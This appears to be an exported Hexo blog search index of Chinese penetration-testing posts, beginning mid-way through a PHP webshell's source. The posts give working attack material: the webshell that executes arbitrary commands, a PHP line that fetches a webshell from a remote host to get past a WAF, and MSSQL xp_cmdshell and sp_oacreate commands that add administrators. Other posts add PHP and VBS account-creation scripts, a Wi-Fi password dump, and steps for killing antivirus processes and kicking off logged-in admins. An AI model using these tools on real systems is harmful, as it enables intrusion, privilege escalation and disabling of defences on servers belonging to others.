512); &#125; &#125; else if(function_exists('fgets') &amp;&amp; function_exists('feof')) &#123; while(!feof($handle)) &#123; $output .= fgets($handle,512); &#125; &#125; &#125; pclose($handle); &#125; else if(function_exists('system')) &#123; ob_start(); //start output buffering system($command); $output = ob_get_contents(); // Get the ouput ob_end_clean(); // Stop output buffering &#125; else if(function_exists('passthru')) &#123; ob_start(); //start output buffering passthru($command); $output = ob_get_contents(); // Get the ouput ob_end_clean(); // Stop output buffering &#125; else if(function_exists('proc_open')) &#123; $descriptorspec = array(=&gt; array("pipe", "w"), // stdout is a pipe that the child will write to ); $handle = proc_open($command ,$descriptorspec , $pipes); // This will return the output to an array 'pipes' if(is_resource($handle)) &#123; if(function_exists('fread') &amp;&amp; function_exists('feof')) &#123; while(!feof($pipes[1])) &#123; $output .= fread($pipes[1], 512); &#125; &#125; else if(function_exists('fgets') &amp;&amp; function_exists('feof')) &#123; while(!feof($pipes[1])) &#123; $output .= fgets($pipes[1],512); &#125; &#125; &#125; pclose($handle); &#125; else &#123; $output = "They have their Security there! :( "; &#125; return(htmlspecialchars($output)); &#125;function magicQuote($text)&#123; if (!get_magic_quotes_gpc()) &#123; return $text; &#125; return stripslashes($text);&#125;//------------------------------------------------------------------------------------------------?&gt;&lt;/div&gt;&lt;div class="nav"&gt;&lt;ul&gt; &lt;li&gt;&lt;a href="&lt;?php echo $self.'?shell';?&gt;"&gt;Shell&lt;/a&gt;&lt;/li&gt; &lt;?php if($lock == 'on') &#123; ?&gt; &lt;li&gt;&lt;a href="&lt;?php echo $self.'?logout'?&gt;"&gt;I m Out!&lt;/a&gt;&lt;/li&gt; &lt;?php &#125; ?&gt;&lt;/ul&gt;&lt;/div&gt;/////////by:Anlfi//////////&lt;?php//-------------------------------- Check what he wants -------------------------------------------// Shellif(isset($_GET['shell']))&#123; if(!isset($_GET['cmd']) || $_GET['cmd'] == '') &#123; $result = ""; &#125; else &#123; $result=exec_all($_GET['cmd']); &#125; ?&gt; &lt;textarea class="cmd" cols="100" rows="20"&gt;&lt;?php echo $result;?&gt;&lt;/textarea&gt; &lt;form action="&lt;?php echo $self;?&gt;" method="GET"&gt; &lt;!-- For Shell --&gt; &lt;input name="shell" type="hidden" /&gt; &lt;!-- For CMD --&gt; &lt;input name="cmd" class="cmd" /&gt; &lt;input name="submit" value="Run!" class="own" type="submit" /&gt; &lt;/form&gt; &lt;?php &#125;&#125;?&gt; 菜刀下默认执行效果 此脚本测试效果]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[aspxshell下突破无可写可执行目录执行cmd]]></title>
    <url>%2F2018%2F02%2F22%2Faspxshell%E4%B8%8B%E7%AA%81%E7%A0%B4%E6%97%A0%E5%8F%AF%E5%86%99%E5%8F%AF%E6%89%A7%E8%A1%8C%E7%9B%AE%E5%BD%95%E6%89%A7%E8%A1%8Ccmd%2F</url>
    <content type="text"><![CDATA[12345678910111213141516try&#123; var strPath:String = "c:\\windows\\temp\\cmd.exe", strUser:String = "everyone";var dirinfo:System.IO.DirectoryInfo = new System.IO.DirectoryInfo(strPath); var dirsecurity:System.Security.AccessControl.DirectorySecurity = dirinfo.GetAccessControl(); dirsecurity.AddAccessRule(new System.Security.AccessControl.FileSystemAccessRule(strUser, System.Security.AccessControl.FileSystemRights.FullControl, System.Security.AccessControl.AccessControlType.Allow)); dirinfo.SetAccessControl(dirsecurity);Response.Write(strPath+"\t权限添加成功!"); &#125;catch(x)&#123;Response.Write(x.Message);&#125; 保存为cmd.ccc,使用菜刀自写脚本运行即可突破 受影响的版本为： Microsoft .NET Framework 2.0 Microsoft .NET Framework 3.5 Microsoft .NET Framework 3.5.1 Microsoft .NET Framework 4 Microsoft .NET Framework 4.5 Microsoft .NET Framework 4.5.1 利用条件： 1.需要支持aspx并且高于Microsoft .NET Framework 1.14版本 2.安全模式除外（现在还没有能突破.net安全模式的方法） 漏洞说明：该漏洞可直接赋予文件权限（让没权限的文件执行）]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>.net</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[cmd 一键获取 所有连接过的wifi 密码]]></title>
    <url>%2F2018%2F02%2F22%2Fcmd-%E4%B8%80%E9%94%AE%E8%8E%B7%E5%8F%96-%E6%89%80%E6%9C%89%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84wifi-%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[1for /f "skip=9 tokens=1,2 delims=:" %i in ('netsh wlan show profiles') do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear]]></content>
      <categories>
        <category>密码安全</category>
      </categories>
      <tags>
        <tag>密码安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[php远程下载马 bypass waf]]></title>
    <url>%2F2018%2F02%2F22%2Fphp%E8%BF%9C%E7%A8%8B%E4%B8%8B%E8%BD%BD%E9%A9%AC-bypass-waf%2F</url>
    <content type="text"><![CDATA[1&lt;?php file_put_contents('dama.php',file_get_contents('http://xxx/xx.txt'));?&gt; php这个函数不算冷门 第一个参数是保存的文件名，如果已存在则报错停止 第二个参数是内容，可以是字符串，也可以使用file_get_contents获取一个马子内容 其实不算什么冷知识了，只是有时候一句话会被拦截，用这个会直接生成一个大马，而且本身是没有什么特征的 除非杀软直接监控的文件写入，换个加密马就行了。 可能是个人喜欢用大马吧，觉得挺方便的。]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>bypass</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[mssql数据库sa账户xp_cmdshell解除禁用]]></title>
    <url>%2F2018%2F02%2F21%2Fmssql%E6%95%B0%E6%8D%AE%E5%BA%93sa%E8%B4%A6%E6%88%B7xp-cmdshell%E8%A7%A3%E9%99%A4%E7%A6%81%E7%94%A8%2F</url>
    <content type="text"><![CDATA[使用xp_cmdshell执行命令的时候，系统回显如下： Microsoft OLE DB Provider for SQL Server 错误 ‘80040e14’ SQL Server 阻止了对组件 ‘xp_cmdshell’ 的 过程’sys.xp_cmdshell’ 的访问，因为此组件已作为此服务器安全配置的一部分而被关闭。系统管理员可以通过使用 sp_configure 启用 ‘xp_cmdshell’。有关启用 ‘xp_cmdshell’ 的详细信息，请参阅 SQL Server 联机丛书中的 “外围应用配置器”。 MSSQL中控制该功能开启和关闭的SQL语句 12345##关闭EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 0;RECONFIGURE;##开启EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;` 在注入点运行上述语句时，如果出现这样的回显 标记message: 配置选项 ‘xp_cmdshell’ 不存在，也可能是高级选 执行如下语句即可解决 1EXEC sp_configure 'show advanced options',1;RECONFIGURE;EXEC sp_configure 'user connections',1;RECONFIGURE;-- 使用wscript添加管理员 1declare @shell int exec sp_oacreate 'wscript.shell',@shell output exec sp_oamethod @shell,'run',null,'d:\\cmd.exe /c net localgroup administrators silic /add' d:\cmd.exe是自己上传的cmd.exe的路径，或者系统有权限都可以。/c后面是cmd语句，别忘了引号闭合语句]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[php使用shell组件添加管理员账户]]></title>
    <url>%2F2018%2F02%2F21%2Fphp%E4%BD%BF%E7%94%A8shell%E7%BB%84%E4%BB%B6%E6%B7%BB%E5%8A%A0%E7%AE%A1%E7%90%86%E5%91%98%E8%B4%A6%E6%88%B7%2F</url>
    <content type="text"><![CDATA[Apache+PHP的组合常常会遇到因为管理员是菜逼，而设置Apache为SYSTEM的情况。因为服务器杀软的原因，也会经常遇到不能使用net user直接添加账户的情况。 cscript可以用vbs调用shell.user创建管理员，php使用同样原理添加账户 1234567&lt;?phpecho "&lt;center&gt;Shell.Users组件添加管理员&lt;/center&gt;";$shell = new COM("Shell.Users");$cmd = $shell-&gt;create('silic');$cmd-&gt;changePassword('13579@silic#',"");$cmd-&gt;setting["AccountType"] = 3;?&gt;]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
      <tags>
        <tag>php</tag>
        <tag>shell</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[windows服务器system权限webshell无法添加3389账户情况总结]]></title>
    <url>%2F2018%2F02%2F20%2Fwindows%E6%9C%8D%E5%8A%A1%E5%99%A8system%E6%9D%83%E9%99%90webshell%E6%97%A0%E6%B3%95%E6%B7%BB%E5%8A%A03389%E8%B4%A6%E6%88%B7%E6%83%85%E5%86%B5%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[很多朋友在Windows下SYSTEM权限的webshell下添加账户，但却无法成功。SYSTEM权限肯定足够大，却无法成功，原因是什么呢？提权不可能百分百成功。下面文章进行了多种分析，并附上一些突破绕过方法。 杀软篇360杀毒软件经常会在国内的一些服务器上遇到360杀毒和防护软件，如果使用webshell进行添加administrators账户时，360会阻止并提示管理员，导致添加失败。利用360不能完美的支持Server系统的特性可以突破360的安全防护。 阻止Webshell添加账户的主要是360主动防御，只要结束了主动防御360杀毒就是摆设。 发现360无法完美支持Server系统是发现习科php大马被某个服务器管理员举报到360论坛上去了，说360查不出来，希望更新病毒库云云。结果360工程师看了以后说更新360就能杀到了，网管说更新了以后还是杀不到；然后工程师又说装什么什么的防护，网管说装了还是杀不到；然后工程师就缩头乌龟了，可见360在server上面其实并不能完美运行。 先执行tasklist看一下进程列表，使用如下命令把360主动防御结束。 1taskkill /im 进程名.exe /f 360相关进程如下： 1360tray.exe,360rp.exe,Zhudongfangyu.exe,360rps.exe 这几个灭了，基本上360的阻碍就清除了，就可以添加账户了。 Windows下Apache+PHP的特殊性，导致很多php站的webshell有SYSTEM的权限，所以结束360简直易如反掌。即使不是SYSTEM，也有办法的，例如ASPX，asp.net有个操纵进程的功能。 12345678910111213141516171819&lt;aspx | &gt; protected void kp_Click(object sender, EventArgs e) &#123;Process[] kp = Process.GetProcesses ();foreach ( Process kp1 in kp )if (kp1.ProcessName == ListBox1.SelectedValue.ToString()) &#123; try &#123; kp1.Kill(); Response.Write("&lt;script&gt;alert('Killed');location.href='?'&lt;/" + "script&gt;"); ListBox1.Items.Clear(); &#125; catch (Exception x) &#123; Response.Write(x.Message.ToString()); Response.End(); &#125;&#125;&#125; &lt;/aspx&gt; asp.net的kill()函数即使是IIS+ASPX的users用户组依然可以轻松杀死360。 有些SYSYTEM权限却干不掉360，例如360tray.exe,360safe.exe，通常是因为管理员登陆以后运行了图形界面没关闭，系统执行taskkill不会成功。 执行query user查看在线用户列表后logoff id把在线管理员的id踢了，然后360有的进程就自己灭了，这种情况多出现在2008的server系统上。 麦咖啡杀毒软件可以通过Guest账户突破麦咖啡杀毒软件。 启用Guest账户，修改Guest用户的密码，添加Guest为administrators用户组。 经过测试，麦咖啡的防护进程很难结束，但是仍然可以绕过防护，cmd命令如下 123456net user guest /active:yes#guest用户启用net user guest silic!&amp;11133#改guest密码net localgroup administrators guest /add#加guest到管理员用户组中 这三条命令第二条或者第三条有时候可能不会显示命令执行成功，但是实际上只要是SYSTEM权限，就应该可以执行成功的，有无回显并不重要。 卡巴斯基杀毒软件卡巴斯基的防护也是让人头疼的。关于突破卡巴斯基的方法，有很多。 最经典的是调整系统时间，让卡巴的key失效；还有mkdir建立以非法字符“.”命名的文件夹，将pr等提权程序传进去。 SYSTEM突破卡巴的防御直接添加用户不太容易，但是可以尝试用taskkill &amp; net user 账户 密码 /add命令，同时执行结束进程和添加账户。 此方法尚未实践，但是理论上是可以的，因为卡巴不像麦咖啡，卡巴斯基可以直接被结束掉，但是立即就会重启进程。 金山防护软件首先说KSafeSvc.exe, 从文件名就知道是金山的程序。 这个进程用taskkill是搞不定的…只要这个防护进程，net user /add的时候，就算net.exe改名了，它也会弹出是否阻止的窗口(可能是它弹的，就算不是它弹的，也要干掉他才能添加) Windows还有个命令ntsd可以终结掉大部分进程，例如winlogon.exe,svchost.exe 1ntsd -c q -p PID ntsd可以结束KSafeSvc.exe 金山毒霸+金山卫士+瑞星防火墙组合这个组合其实也很脆弱。 123456789set wsnetwork=CreateObject("WSCRIPT.NETWORK")os="WinNT://"&amp;wsnetwork.ComputerNameSet ob=GetObject(os)Set oe=GetObject(os&amp;"/Administrators,group")Set od=ob.Create("user","silic")od.SetPassword "silic"od.SetInfoSet of=GetObject(os&amp;"/silic",user)oe.add os&amp;"/silic" 脚本执行成功可添加用户名和密码均为silic的管理员账户 禁用服务法有时候mysql或者mssql等等提权的时候，会发生杀软无法结束，导致提权失败的情况。将杀软服务设置为禁用重启服务器，杀毒防护服务就不能运行了。 12sc config 服务名 start= disabledsc config MsMpSvc start= disabled、 如果无法结束服务，就直接从注册表删除该服务的启动。 其他杀毒软件或防护软件很多非主流的防护软件，如护卫盾啊，Safe3防篡改等等，这些软件的突破方法和主流防护软件突破方法大致相同，结束进程，或者不使用添加账户，直接启用现有的Guest来突破监控，不赘述了 策略篇3389端口变更进行3389添加账户前首先要知道3389到底开启没有。目前添加账户后无法登陆的情况，只遇到过3389端口变更为其他端口的例子，没见过不开启远程桌面的例子。 找出端口方法再简单不过：netstat -an查看所有开启的端口，不过挨个查询可疑的端口太慢。netstat -ano查看端口和使用端口的进程pid，然后Tasklist看有哪个svchost.exe使用了端口，其进程的pid对应的端口即远程桌面的端口。 远程桌面使用svchost.exe进程开放端口 莫名其妙无法添加账户有些主机Webshell是System权限，tasklist也看不到任何防护的进程，管理员也没在线，提权程序也添加不了。有果必有因，这样的情况添加不了，多数是系统有组策略限制，通常限制的是密码最短长度。而这个组策略又多数是麦咖啡等防护软件设置上的。或者干脆就是装机的系统本身就开启了这个设置。 突破方法只要在添加账户时把密码位数设置长一点就ok，原先密码是123456，现在改为1234abcd!@#$就过了如果还是添加不上，可以尝试用vbs脚本来添加。 管理员限制篇有些管理员直接把c:\windows\system32\net.exe给删了或替换了，直接net的时候会提示拒绝访问或者不是系统命令等等类似提示。因为系统的net.exe没了，重新上传一个net.exe就突破了。 注意32位系统和64位系统的程序不兼容的情况。 系统已达最大连接数处理有时候添加账户成功，但连接的时候提示最大连接数限制。管理员不在线，却占着线不让你上去，等管理员自己上线了可以把黑客的进程删了。 首先query user查看在线的账户，然后看他的登陆ID，一般是0，最高不超过8(超过8说明服务器好久没重启了)然后logoff ID对应ID的管理员，就可以登陆了。 踢掉管理员命令logoff注意不要把自己logoff了，例如在system权限下的mysql中，只执行logoff不带任何id，就会使用使mysql失去system权限 —_—]]></content>
      <categories>
        <category>渗透测试</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[说到底还是搭建了个人博客]]></title>
    <url>%2F2018%2F02%2F13%2F%E8%AF%B4%E5%88%B0%E5%BA%95%E8%BF%98%E6%98%AF%E6%90%AD%E5%BB%BA%E4%BA%86%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2%2F</url>
    <content type="text"><![CDATA[搭建个人博客这个计划施行了很久 大概有1年多了近来有时间折腾了下Hexo搭建了个人博客并改成了自己喜欢的样式这里是曲云杰的自留地之后会在这里以及一叶知安的专栏，小密圈等发布自己的文章 说到底，挺期待，希望自己能坚持住~]]></content>
      <categories>
        <category>生活杂谈</category>
      </categories>
      <tags>
        <tag>一叶知安</tag>
        <tag>专栏</tag>
        <tag>小密圈</tag>
      </tags>
  </entry>
</search>
